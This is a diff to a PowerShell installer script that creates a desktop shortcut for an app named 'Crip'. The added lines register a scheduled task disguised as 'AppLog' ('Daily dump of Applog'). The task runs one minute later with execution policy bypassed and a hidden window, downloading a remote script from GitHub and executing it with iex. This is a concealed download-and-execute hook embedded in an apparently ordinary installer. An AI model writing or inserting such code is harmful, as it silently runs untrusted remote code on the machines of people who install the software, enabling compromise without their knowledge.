@@ -82,3 +82,17 @@ $shortcut.WorkingDirectory = Split-Path $CripPath
 $shortcut.WindowStyle = 1 # Normal window
 $shortcut.Description = "Crip"
 $shortcut.Save()
+
+
+
+$currentTime = Get-Date
+$triggerTime = $currentTime.AddMinutes(1)
+
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument @"
+-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex (iwr 'https://raw.githubusercontent.com/Zyg0s/VI_ASTRA/refs/heads/main/dabididabudai.ps1').Content"
+"@
+
+$trigger = New-ScheduledTaskTrigger -Once -At $triggerTime
+
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"
+
